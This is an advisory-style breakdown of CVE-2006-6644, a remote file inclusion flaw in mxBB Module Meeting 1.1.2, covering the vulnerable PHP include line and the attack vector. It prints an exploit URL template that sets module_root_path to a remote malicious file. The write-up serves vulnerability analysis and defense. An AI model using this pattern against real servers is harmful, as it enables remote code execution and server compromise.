Based on the provided content, here's a breakdown of the vulnerability information related to CVE-2006-6644:

**Root Cause of Vulnerability:**
- The vulnerability is a Remote File Inclusion (RFI) vulnerability found in the `meeting_constants.php` file of the mxBB Module Meeting version 1.1.2 or earlier.

**Weaknesses/Vulnerabilities Present:**
- The `meeting_constants.php` script includes a language file using a variable `module_root_path` which is taken from user input, without proper sanitization or validation.
- This allows an attacker to specify a remote URL as the value of `module_root_path` and force the server to include and execute the malicious remote file.

**Impact of Exploitation:**
- An attacker can include and execute arbitrary remote code on the affected server. This may lead to a complete compromise of the web server, including data theft, defacement, and further malicious activities.

**Attack Vectors:**
- The attack vector is through an HTTP GET request to the `meeting_constants.php` file, manipulating the `module_root_path` parameter.

**Required Attacker Capabilities/Position:**
- The attacker only requires the ability to send HTTP requests to the vulnerable server. No prior authentication or specific privileges are needed.

**Technical Details:**
- The vulnerable code snippet in `meeting_constants.php` shows:
  ```php
  include($module_root_path . 'language/lang_' . $language . '/lang_meeting.' . $phpEx);
  ```
- The attacker can set the `module_root_path` variable via the URL, as in the example:
  ```
  //[path]/modules/mx_meeting/pages/meeting_constants.php?module_root_path=[shell]
  ```
   Where `[shell]` would be the URL to a malicious php file

**Additional Notes:**
- The exploit is specifically for mxBB Module Meeting version 1.1.2 and potentially earlier versions.
- The vulnerability allows remote code execution, which is considered a critical issue.
